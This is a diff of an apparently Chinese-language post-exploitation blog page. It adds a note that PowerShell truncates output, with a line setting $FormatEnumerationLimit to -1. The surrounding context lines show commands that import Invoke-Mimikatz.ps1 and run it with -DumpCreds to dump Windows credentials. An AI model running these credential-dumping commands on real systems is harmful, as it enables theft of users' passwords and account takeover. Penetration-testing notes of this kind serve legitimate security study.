@@ -63,6 +63,14 @@ powershell_execute Invoke-Mimikatz -DumpCreds
 powershell-import /home/exp10it/Invoke-Mimikatz.ps1
 powershell-execute Invoke-Mimikatz -DumpCreds
 ```
+
+## 注意
+
+PowerShell 默认限制输出长度, 需手动更改.
+
+```
+$FormatEnumerationLimit = -1
+```
 <!-- markdown end -->
 </xmp>
 <div class="entry" id="main">
@@ -99,6 +107,13 @@ powershell_execute Invoke-Mimikatz -DumpCreds
 
 <pre><code>powershell-import /home/exp10it/Invoke-Mimikatz.ps1
 powershell-execute Invoke-Mimikatz -DumpCreds
+</code></pre>
+
+<h2 id="">注意</h2>
+
+<p>PowerShell 默认限制输出长度, 需手动更改.</p>
+
+<pre><code>$FormatEnumerationLimit = -1
 </code></pre>
 <!-- content end -->
 </div>
